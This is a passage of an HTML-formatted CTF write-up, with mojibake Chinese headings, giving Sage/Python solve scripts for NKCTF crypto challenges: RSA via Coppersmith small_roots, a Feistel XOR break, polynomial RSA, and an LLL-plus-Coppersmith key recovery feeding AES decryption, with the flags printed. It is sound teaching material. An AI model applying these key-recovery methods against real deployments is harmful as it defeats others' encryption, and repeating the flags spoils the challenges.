class="hljs-number">78327207863361017953496121356221173288422862370301396867341957979087627011991738176024643637029313969241151622985226595093079857523487726626882109114134910056673489916408854152274726721451884257677533593174371742411008169082367666168983943358876017521749198218529804830864940274185360506199116451280975188409</span><br>e = <span class="hljs-number">65537</span><br><span class="hljs-comment">#c1 = m^e mod p*q</span><br><span class="hljs-comment">#m1 = c1^d mod p*q*r*t</span><br><span class="hljs-comment">#m1 = m mod p*q âˆš</span><br>d = invert(e, phi)<br>c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c1, d, n))<br>PR.&lt; x &gt; = PolynomialRing(Zmod(n))<br>f = c - x <span class="hljs-comment">#c-x=k*p*q</span><br>f = f.monic()<br>x0 = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">300</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.015</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(x0)<br><span class="hljs-comment">#NKCTF&#123;it_i5_e45y_th4t_Kn0wn</span><br><br>N = <span class="hljs-number">157202814866563156513184271957553223260772141845129283711146204376449001653397810781717934720804041916333174673656579086498762693983380365527400604554663873045166444369504886603233275868192688995284322277504050322927511160583280269073338415758019142878016084536129741435221345599028001581385308324407324725353</span><br>c2 = <span class="hljs-number">63355788175487221030596314921407476078592001060627033831694843409637965350474955727383434406640075122932939559532216639739294413008164038257338675094324172634789610307227365830016457714456293397466445820352804725466971828172010276387616894829328491068298742711984800900411277550023220538443014162710037992032</span><br>c3 = <span class="hljs-number">9266334096866207047544089419994475379619964393206968260875878305040712629590906330073542575719856965053269812924808810766674072615270535207284077081944428011398767330973702305174973148018082513467080087706443512285098600431136743009829009567065760786940706627087366702015319792328141978938111501345426931078</span><br><br>PR.&lt; x &gt; = PolynomialRing(Zmod(N))<br>f = x^<span class="hljs-number">2</span>-(c2+c3)*x+c2*c3<br>f = f.monic()<br>x0 = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">440</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.015</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(x0)<br><span class="hljs-comment">#_phi_4nd_N_dec0mp0ses_N_w1th_th3_s4m3_c0mm0n_n_but_pq&#125;</span><br></code></pre></td></tr></table></figure><h2 id="eZ-BlâŠ•ck">eZ_BlâŠ•ck</h2><p>è€ƒç‚¹</p><ol><li>Feistelç»“æ„</li><li>å¼‚æˆ–</li></ol><p>å¯ä»¥å‚è€ƒï¼š<a href="http://striving.mapleice.top/index.php/archives/150/%E7%AC%AC%E4%B8%89%E9%A2%98%E5%AD%A6%E4%B9%A0">http://striving.mapleice.top/index.php/archives/150/ç¬¬ä¸‰é¢˜å­¦ä¹ </a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> *<br><br>r=<span class="hljs-string">b&quot;t\xf7\xaa\xac\x9d\x88\xa4\x8b\x1f+pA\x84\xacHg&#x27;\x07&#123;\xcc\x06\xc4i\xdd)\xda\xc9\xad\xa9\xe8\x1fi&quot;</span><br>c1=<span class="hljs-string">b&quot;&#x27;&#123;&lt;z&#125;\x91\xda\xc5\xd5S\x8b\xfa\x9f~]J\x0f\xf4\x9a\x1e\xe0\xef\x129N\xe7a\x928+\xe0\xee&quot;</span><br>c2=<span class="hljs-string">b&#x27;8\x1f&quot;\x83B4\x86)\xce\xebq3\x06\xa0w\x16U\x04M/w\xa1\x8f;)M\xdd~\x11:\xe3\xb3&#x27;</span><br><br>kn1=strxor(r[<span class="hljs-number">16</span>:],c1[:<span class="hljs-number">16</span>])<br><br>l1=strxor(kn1,c2[:<span class="hljs-number">16</span>])<br><span class="hljs-built_in">print</span>(l1)<br><br>kn2=strxor(strxor(r[<span class="hljs-number">16</span>:],r[:<span class="hljs-number">16</span>]),c1[<span class="hljs-number">16</span>:])<br>r1=strxor(strxor(kn2,c2[<span class="hljs-number">16</span>:]),l1)<br><span class="hljs-built_in">print</span>(r1)<br><br><span class="hljs-comment">#NKCTF&#123;1ccd5cee-c96d-4caf-8ce5-9a512b3d0655&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ez-polynomial">ez_polynomial</h2><p>è€ƒç‚¹ï¼š</p><ol><li>å…¸å‹çš„å¤šé¡¹å¼rsa</li></ol><p>å¯ä»¥å‚è€ƒ:<a href="https://blog.csdn.net/m0_57291352/article/details/124850426%E5%AD%A6%E4%B9%A0">https://blog.csdn.net/m0_57291352/article/details/124850426å­¦ä¹ </a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">40031</span><br>R.&lt;y&gt; = PolynomialRing(GF(p))<br>N=<span class="hljs-number">24096</span>*y^<span class="hljs-number">93</span> + <span class="hljs-number">38785</span>*y^<span class="hljs-number">92</span> + <span class="hljs-number">17489</span>*y^<span class="hljs-number">91</span> + <span class="hljs-number">9067</span>*y^<span class="hljs-number">90</span> + <span class="hljs-number">1034</span>*y^<span class="hljs-number">89</span> + <span class="hljs-number">6534</span>*y^<span class="hljs-number">88</span> + <span class="hljs-number">35818</span>*y^<span class="hljs-number">87</span> + <span class="hljs-number">22046</span>*y^<span class="hljs-number">86</span> + <span class="hljs-number">12887</span>*y^<span class="hljs-number">85</span> + <span class="hljs-number">445</span>*y^<span class="hljs-number">84</span> + <span class="hljs-number">26322</span>*y^<span class="hljs-number">83</span> + <span class="hljs-number">37045</span>*y^<span class="hljs-number">82</span> + <span class="hljs-number">4486</span>*y^<span class="hljs-number">81</span> + <span class="hljs-number">3503</span>*y^<span class="hljs-number">80</span> + <span class="hljs-number">1184</span>*y^<span class="hljs-number">79</span> + <span class="hljs-number">38471</span>*y^<span class="hljs-number">78</span> + <span class="hljs-number">8012</span>*y^<span class="hljs-number">77</span> + <span class="hljs-number">36561</span>*y^<span class="hljs-number">76</span> + <span class="hljs-number">19429</span>*y^<span class="hljs-number">75</span> + <span class="hljs-number">35227</span>*y^<span class="hljs-number">74</span> + <span class="hljs-number">10813</span>*y^<span class="hljs-number">73</span> + <span class="hljs-number">26341</span>*y^<span class="hljs-number">72</span> + <span class="hljs-number">29474</span>*y^<span class="hljs-number">71</span> + <span class="hljs-number">2059</span>*y^<span class="hljs-number">70</span> + <span class="hljs-number">16068</span>*y^<span class="hljs-number">69</span> + <span class="hljs-number">31597</span>*y^<span class="hljs-number">68</span> + <span class="hljs-number">14685</span>*y^<span class="hljs-number">67</span> + <span class="hljs-number">9266</span>*y^<span class="hljs-number">66</span> + <span class="hljs-number">31019</span>*y^<span class="hljs-number">65</span> + <span class="hljs-number">6171</span>*y^<span class="hljs-number">64</span> + <span class="hljs-number">385</span>*y^<span class="hljs-number">63</span> + <span class="hljs-number">28986</span>*y^<span class="hljs-number">62</span> + <span class="hljs-number">9912</span>*y^<span class="hljs-number">61</span> + <span class="hljs-number">10632</span>*y^<span class="hljs-number">60</span> + <span class="hljs-number">33741</span>*y^<span class="hljs-number">59</span> + <span class="hljs-number">12634</span>*y^<span class="hljs-number">58</span> + <span class="hljs-number">21179</span>*y^<span class="hljs-number">57</span> + <span class="hljs-number">35548</span>*y^<span class="hljs-number">56</span> + <span class="hljs-number">17894</span>*y^<span class="hljs-number">55</span> + <span class="hljs-number">7152</span>*y^<span class="hljs-number">54</span> + <span class="hljs-number">9440</span>*y^<span class="hljs-number">53</span> + <span class="hljs-number">4004</span>*y^<span class="hljs-number">52</span> + <span class="hljs-number">2600</span>*y^<span class="hljs-number">51</span> + <span class="hljs-number">12281</span>*y^<span class="hljs-number">50</span> + <span class="hljs-number">22</span>*y^<span class="hljs-number">49</span> + <span class="hljs-number">17314</span>*y^<span class="hljs-number">48</span> + <span class="hljs-number">32694</span>*y^<span class="hljs-number">47</span> + <span class="hljs-number">7693</span>*y^<span class="hljs-number">46</span> + <span class="hljs-number">6567</span>*y^<span class="hljs-number">45</span> + <span class="hljs-number">19897</span>*y^<span class="hljs-number">44</span> + <span class="hljs-number">27329</span>*y^<span class="hljs-number">43</span> + <span class="hljs-number">8799</span>*y^<span class="hljs-number">42</span> + <span class="hljs-number">36348</span>*y^<span class="hljs-number">41</span> + <span class="hljs-number">33963</span>*y^<span class="hljs-number">40</span> + <span class="hljs-number">23730</span>*y^<span class="hljs-number">39</span> + <span class="hljs-number">27685</span>*y^<span class="hljs-number">38</span> + <span class="hljs-number">29037</span>*y^<span class="hljs-number">37</span> + <span class="hljs-number">14622</span>*y^<span class="hljs-number">36</span> + <span class="hljs-number">29608</span>*y^<span class="hljs-number">35</span> + <span class="hljs-number">39588</span>*y^<span class="hljs-number">34</span> + <span class="hljs-number">23294</span>*y^<span class="hljs-number">33</span> + <span class="hljs-number">757</span>*y^<span class="hljs-number">32</span> + <span class="hljs-number">20140</span>*y^<span class="hljs-number">31</span> + <span class="hljs-number">19511</span>*y^<span class="hljs-number">30</span> + <span class="hljs-number">1469</span>*y^<span class="hljs-number">29</span> + <span class="hljs-number">3898</span>*y^<span class="hljs-number">28</span> + <span class="hljs-number">6630</span>*y^<span class="hljs-number">27</span> + <span class="hljs-number">19610</span>*y^<span class="hljs-number">26</span> + <span class="hljs-number">11631</span>*y^<span class="hljs-number">25</span> + <span class="hljs-number">7188</span>*y^<span class="hljs-number">24</span> + <span class="hljs-number">11683</span>*y^<span class="hljs-number">23</span> + <span class="hljs-number">35611</span>*y^<span class="hljs-number">22</span> + <span class="hljs-number">37286</span>*y^<span class="hljs-number">21</span> + <span class="hljs-number">32139</span>*y^<span class="hljs-number">20</span> + <span class="hljs-number">20296</span>*y^<span class="hljs-number">19</span> + <span class="hljs-number">36426</span>*y^<span class="hljs-number">18</span> + <span class="hljs-number">25340</span>*y^<span class="hljs-number">17</span> + <span class="hljs-number">36204</span>*y^<span class="hljs-number">16</span> + <span class="hljs-number">37787</span>*y^<span class="hljs-number">15</span> + <span class="hljs-number">31256</span>*y^<span class="hljs-number">14</span> + <span class="hljs-number">505</span>*y^<span class="hljs-number">13</span> + <span class="hljs-number">27508</span>*y^<span class="hljs-number">12</span> + <span class="hljs-number">20885</span>*y^<span class="hljs-number">11</span> + <span class="hljs-number">32037</span>*y^<span class="hljs-number">10</span> + <span class="hljs-number">31236</span>*y^<span class="hljs-number">9</span> + <span class="hljs-number">7929</span>*y^<span class="hljs-number">8</span> + <span class="hljs-number">27195</span>*y^<span class="hljs-number">7</span> + <span class="hljs-number">28980</span>*y^<span class="hljs-number">6</span> + <span class="hljs-number">11863</span>*y^<span class="hljs-number">5</span> + <span class="hljs-number">16025</span>*y^<span class="hljs-number">4</span> + <span class="hljs-number">16389</span>*y^<span class="hljs-number">3</span> + <span class="hljs-number">570</span>*y^<span class="hljs-number">2</span> + <span class="hljs-number">36547</span>*y + <span class="hljs-number">10451</span><br>e = <span class="hljs-number">65537</span><br>q1,q2=N.factor()<br>q1,q2=q1[<span class="hljs-number">0</span>],q2[<span class="hljs-number">0</span>]<br>phi = (p**q1.degree() - <span class="hljs-number">1</span>) * (p**q2.degree() - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">assert</span> gcd(e, phi) == <span class="hljs-number">1</span><br>d = inverse_mod(e, phi)<br>S.&lt;x&gt; = R.quotient(N)<br>C=<span class="hljs-number">3552</span>*x^<span class="hljs-number">92</span> + <span class="hljs-number">6082</span>*x^<span class="hljs-number">91</span> + <span class="hljs-number">25295</span>*x^<span class="hljs-number">90</span> + <span class="hljs-number">35988</span>*x^<span class="hljs-number">89</span> + <span class="hljs-number">26052</span>*x^<span class="hljs-number">88</span> + <span class="hljs-number">16987</span>*x^<span class="hljs-number">87</span> + <span class="hljs-number">12854</span>*x^<span class="hljs-number">86</span> + <span class="hljs-number">25117</span>*x^<span class="hljs-number">85</span> + <span class="hljs-number">25800</span>*x^<span class="hljs-number">84</span> + <span class="hljs-number">30297</span>*x^<span class="hljs-number">83</span> + <span class="hljs-number">5589</span>*x^<span class="hljs-number">82</span> + <span class="hljs-number">23233</span>*x^<span class="hljs-number">81</span> + <span class="hljs-number">14449</span>*x^<span class="hljs-number">80</span> + <span class="hljs-number">4712</span>*x^<span class="hljs-number">79</span> + <span class="hljs-number">35719</span>*x^<span class="hljs-number">78</span> + <span class="hljs-number">1696</span>*x^<span class="hljs-number">77</span> + <span class="hljs-number">35653</span>*x^<span class="hljs-number">76</span> + <span class="hljs-number">13995</span>*x^<span class="hljs-number">75</span> + <span class="hljs-number">13715</span>*x^<span class="hljs-number">74</span> + <span class="hljs-number">4578</span>*x^<span class="hljs-number">73</span> + <span class="hljs-number">37366</span>*x^<span class="hljs-number">72</span> + <span class="hljs-number">25260</span>*x^<span class="hljs-number">71</span> + <span class="hljs-number">28865</span>*x^<span class="hljs-number">70</span> + <span class="hljs-number">36120</span>*x^<span class="hljs-number">69</span> + <span class="hljs-number">7047</span>*x^<span class="hljs-number">68</span> + <span class="hljs-number">10497</span>*x^<span class="hljs-number">67</span> + <span class="hljs-number">19160</span>*x^<span class="hljs-number">66</span> + <span class="hljs-number">17939</span>*x^<span class="hljs-number">65</span> + <span class="hljs-number">14850</span>*x^<span class="hljs-number">64</span> + <span class="hljs-number">6705</span>*x^<span class="hljs-number">63</span> + <span class="hljs-number">17805</span>*x^<span class="hljs-number">62</span> + <span class="hljs-number">30083</span>*x^<span class="hljs-number">61</span> + <span class="hljs-number">2400</span>*x^<span class="hljs-number">60</span> + <span class="hljs-number">10685</span>*x^<span class="hljs-number">59</span> + <span class="hljs-number">15272</span>*x^<span class="hljs-number">58</span> + <span class="hljs-number">2225</span>*x^<span class="hljs-number">57</span> + <span class="hljs-number">13194</span>*x^<span class="hljs-number">56</span> + <span class="hljs-number">14251</span>*x^<span class="hljs-number">55</span> + <span class="hljs-number">31016</span>*x^<span class="hljs-number">54</span> + <span class="hljs-number">10189</span>*x^<span class="hljs-number">53</span> + <span class="hljs-number">35040</span>*x^<span class="hljs-number">52</span> + <span class="hljs-number">7042</span>*x^<span class="hljs-number">51</span> + <span class="hljs-number">29206</span>*x^<span class="hljs-number">50</span> + <span class="hljs-number">39363</span>*x^<span class="hljs-number">49</span> + <span class="hljs-number">32608</span>*x^<span class="hljs-number">48</span> + <span class="hljs-number">38614</span>*x^<span class="hljs-number">47</span> + <span class="hljs-number">5528</span>*x^<span class="hljs-number">46</span> + <span class="hljs-number">20119</span>*x^<span class="hljs-number">45</span> + <span class="hljs-number">13439</span>*x^<span class="hljs-number">44</span> + <span class="hljs-number">25468</span>*x^<span class="hljs-number">43</span> + <span class="hljs-number">30056</span>*x^<span class="hljs-number">42</span> + <span class="hljs-number">19720</span>*x^<span class="hljs-number">41</span> + <span class="hljs-number">21808</span>*x^<span class="hljs-number">40</span> + <span class="hljs-number">3712</span>*x^<span class="hljs-number">39</span> + <span class="hljs-number">25243</span>*x^<span class="hljs-number">38</span> + <span class="hljs-number">10606</span>*x^<span class="hljs-number">37</span> + <span class="hljs-number">16247</span>*x^<span class="hljs-number">36</span> + <span class="hljs-number">36106</span>*x^<span class="hljs-number">35</span> + <span class="hljs-number">17287</span>*x^<span class="hljs-number">34</span> + <span class="hljs-number">36276</span>*x^<span class="hljs-number">33</span> + <span class="hljs-number">1407</span>*x^<span class="hljs-number">32</span> + <span class="hljs-number">28839</span>*x^<span class="hljs-number">31</span> + <span class="hljs-number">8459</span>*x^<span class="hljs-number">30</span> + <span class="hljs-number">38863</span>*x^<span class="hljs-number">29</span> + <span class="hljs-number">435</span>*x^<span class="hljs-number">28</span> + <span class="hljs-number">913</span>*x^<span class="hljs-number">27</span> + <span class="hljs-number">36619</span>*x^<span class="hljs-number">26</span> + <span class="hljs-number">15572</span>*x^<span class="hljs-number">25</span> + <span class="hljs-number">9363</span>*x^<span class="hljs-number">24</span> + <span class="hljs-number">36837</span>*x^<span class="hljs-number">23</span> + <span class="hljs-number">17925</span>*x^<span class="hljs-number">22</span> + <span class="hljs-number">38567</span>*x^<span class="hljs-number">21</span> + <span class="hljs-number">38709</span>*x^<span class="hljs-number">20</span> + <span class="hljs-number">13582</span>*x^<span class="hljs-number">19</span> + <span class="hljs-number">35038</span>*x^<span class="hljs-number">18</span> + <span class="hljs-number">31121</span>*x^<span class="hljs-number">17</span> + <span class="hljs-number">8933</span>*x^<span class="hljs-number">16</span> + <span class="hljs-number">1666</span>*x^<span class="hljs-number">15</span> + <span class="hljs-number">21940</span>*x^<span class="hljs-number">14</span> + <span class="hljs-number">25585</span>*x^<span class="hljs-number">13</span> + <span class="hljs-number">840</span>*x^<span class="hljs-number">12</span> + <span class="hljs-number">21938</span>*x^<span class="hljs-number">11</span> + <span class="hljs-number">20143</span>*x^<span class="hljs-number">10</span> + <span class="hljs-number">28507</span>*x^<span class="hljs-number">9</span> + <span class="hljs-number">5947</span>*x^<span class="hljs-number">8</span> + <span class="hljs-number">20289</span>*x^<span class="hljs-number">7</span> + <span class="hljs-number">32196</span>*x^<span class="hljs-number">6</span> + <span class="hljs-number">924</span>*x^<span class="hljs-number">5</span> + <span class="hljs-number">370</span>*x^<span class="hljs-number">4</span> + <span class="hljs-number">14849</span>*x^<span class="hljs-number">3</span> + <span class="hljs-number">10780</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">14035</span>*x + <span class="hljs-number">15327</span><br>m=C^d<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="Raven">Raven</h2><p>æŒºæœ‰æ„æ€çš„ä¸€ä¸ªé¢˜ç›®ï¼Œå¤šé¡¹å¼çš„ç³»æ•°éƒ½æ¯”è¾ƒå°ã€‚æ‰€ä»¥å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ª6æ¬¡çš„ä¸€å…ƒå¤šé¡¹å¼ã€‚é€ æ ¼å­å‡ºç³»æ•°ï¼ˆä¸è¿‡ä¸çŸ¥é“ä¸ºå•¥dä¸èƒ½ç›´æ¥å‡ºï¼Œè¿™é‡Œæ˜¯å…ˆå‡ºa,b,cã€‚å†å•ç‹¬äºŒå…ƒcopperæ±‚dï¼‰ã€‚</p><p>æ¶‰åŠåˆ°æ ¼åŸºè§„çº¦å’ŒäºŒå…ƒcoppersimthï¼Œè¾ƒä¸ºå¤æ‚ï¼Œå…ˆè‡ªè¡Œç ”ç©¶ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p</span> = <br><span class="hljs-attribute">pairs</span> = <br><br><span class="hljs-attribute">K</span>=<span class="hljs-number">2</span>**<span class="hljs-number">520</span><br><span class="hljs-attribute">M</span>=[[<span class="hljs-number">0</span> for i in range(<span class="hljs-number">12</span>)] for j in range(<span class="hljs-number">12</span>)]  #M=[[<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>]*<span class="hljs-number">12</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">4</span>):<br>    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">7</span>):<br>        <span class="hljs-attribute">M</span>[j][i]=p-pow(pairs[i][<span class="hljs-number">0</span>],<span class="hljs-number">6</span>-j,p)<br>    <span class="hljs-attribute">M</span>[<span class="hljs-number">7</span>+i][i]=p<br>    <span class="hljs-attribute">M</span>[<span class="hljs-number">11</span>][i]=pairs[i][<span class="hljs-number">1</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">7</span>):<br>    <span class="hljs-attribute">M</span>[i][<span class="hljs-number">4</span>+i]=<span class="hljs-number">1</span><br><span class="hljs-attribute">M</span>[-<span class="hljs-number">1</span>][-<span class="hljs-number">1</span>]=K<br><span class="hljs-attribute">M</span>=Matrix(M)<br><span class="hljs-attribute">L</span>=M.LLL()<br><span class="hljs-attribute">for</span> i in L:<br>    <span class="hljs-attribute">if</span> int(i[-<span class="hljs-number">1</span>])==K:<br>        <span class="hljs-attribute">print</span>(i)<br>        <span class="hljs-attribute">sol</span>=i*M^-<span class="hljs-number">1</span><br><span class="hljs-attribute">sol</span>=[int(i) for i in sol[:<span class="hljs-number">7</span>]]<br><span class="hljs-attribute">print</span>(sol)<br><span class="hljs-attribute">from</span> gmpy2 import *<br><span class="hljs-attribute">a</span>=int(iroot(sol[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br><span class="hljs-attribute">b</span>=sol[<span class="hljs-number">1</span>]//(<span class="hljs-number">2</span>*a)<br><span class="hljs-attribute">c</span>=(sol[<span class="hljs-number">2</span>]-b*b)//(<span class="hljs-number">2</span>*a)<br><span class="hljs-attribute">print</span>(a,b,c)<br><span class="hljs-comment">#d=256836945952994885035467059118377791095</span><br><br></code></pre></td></tr></table></figure><p>äºŒå…ƒcoppersmithæ¢å¤key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br><br><span class="hljs-comment"># ä¸€ç§æ±‚å¤šé¡¹å¼å°æ ¹é—®é¢˜çš„æ–¹æ³•</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br><br>    R = f.base_ring()<br>    N = R.cardinality()<br><br>    f /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    f = f.change_ring(ZZ)<br><br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ^ (m - i) * f ^ i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br><br>    B, monomials = G.coefficient_matrix()<br>    monomials = vector(monomials)<br><br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br><br>    B = B.dense_matrix().LLL()<br><br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br><br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br><br>    <span class="hljs-keyword">return</span> []<br><br>r3=<span class="hljs-number">38110026992499584203762396049303607649993098725357412914752750999593537061009</span><br>x3=<span class="hljs-number">68711183101845981499596464753252121346970486988311398916877579778110690480447199642602267233989256728822535174215153145632158860662954277116345331672194812126361911061449082917955000137698138358926301360506687271134873</span><br>y3=<span class="hljs-number">995428771589393162202488762223106955302099250561593105620410424291405842350539887383005328242236156038373244928147473800972534658018117705291472213770335998508454938607290279268848513727721410314612261163489156360908800</span><br>p=<span class="hljs-number">1018551160851728231474335384388576586031917743463656622083024684199383855595168341728561337234276243780407755294430553694832049089534855113774546001494743212076463713621965520780122783825100696968959866614846174188401153</span><br><br>a,b,c=(<span class="hljs-number">248509346369130391242170998803167584710</span>,<span class="hljs-number">34130269465266010935033619912669159600</span>,<span class="hljs-number">190347116220905792012773821811284452644</span>)<br>A=a*x3*x3*x3+b*x3*x3+c*x3<br><span class="hljs-comment"># è®¾ç½®ä¸€ä¸ªåŸºäºæ•´æ•°ç¯çš„å¤šé¡¹å¼,ä¸€å…ƒæˆ–è€…å¤šå…ƒ</span><br>P.&lt; x, y &gt;= PolynomialRing(Zmod(p))<br><span class="hljs-comment"># fä¸ºå¤šé¡¹å¼</span><br>f = (A+x)*(A+x)+y-y3<br><span class="hljs-comment"># boundsä¸ºæ ¹çš„æœ€å¤§å€¼,ç²—ç•¥èŒƒå›´å³å¯</span><br>bounds =(<span class="hljs-number">2</span>^<span class="hljs-number">128</span>,<span class="hljs-number">2</span>^<span class="hljs-number">256</span>)<br><span class="hljs-comment"># m,dé€‰å¡«</span><br>m = <span class="hljs-number">3</span><br>d = <span class="hljs-number">4</span><br>roots = small_roots(f, bounds, m, d)<br><span class="hljs-built_in">print</span>(roots)<br></code></pre></td></tr></table></figure><p>è§£AES</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">from Crypto.Util.number <span class="hljs-built_in">import</span> <span class="hljs-operator">*</span><br>from Crypto.Cipher <span class="hljs-built_in">import</span> AES<br><br><span class="hljs-attr">key</span><span class="hljs-operator">=</span><span class="hljs-number">256836945952994885035467059118377791095</span><br>c<span class="hljs-attr">ipher</span> <span class="hljs-operator">=</span> AES.new(key<span class="hljs-operator">=</span>long_to_bytes(key), IV<span class="hljs-operator">=</span>bytes(range(<span class="hljs-number">16</span>)), mode<span class="hljs-operator">=</span>AES.MODE_CBC)<br><br><span class="hljs-attr">ct</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;|2<span class="hljs-char escape_">\x</span>f0v7<span class="hljs-char escape_">\x</span>05Y<span class="hljs-char escape_">\x</span>89<span class="hljs-char escape_">\r</span>]<span class="hljs-char escape_">\x</span>e93s<span class="hljs-char escape_">\r</span>r)#3<span class="hljs-char escape_">\x</span>e9<span class="hljs-char escape_">\x</span>90%Z<span class="hljs-char escape_">\x</span>9a<span class="hljs-char escape_">\x</span>d9<span class="hljs-char escape_">\x</span>9ck<span class="hljs-char escape_">\x</span>ba<span class="hljs-char escape_">\x</span>ec]q<span class="hljs-char escape_">\x</span>b8<span class="hljs-char escape_">\x</span>f2&#x27;<span class="hljs-char 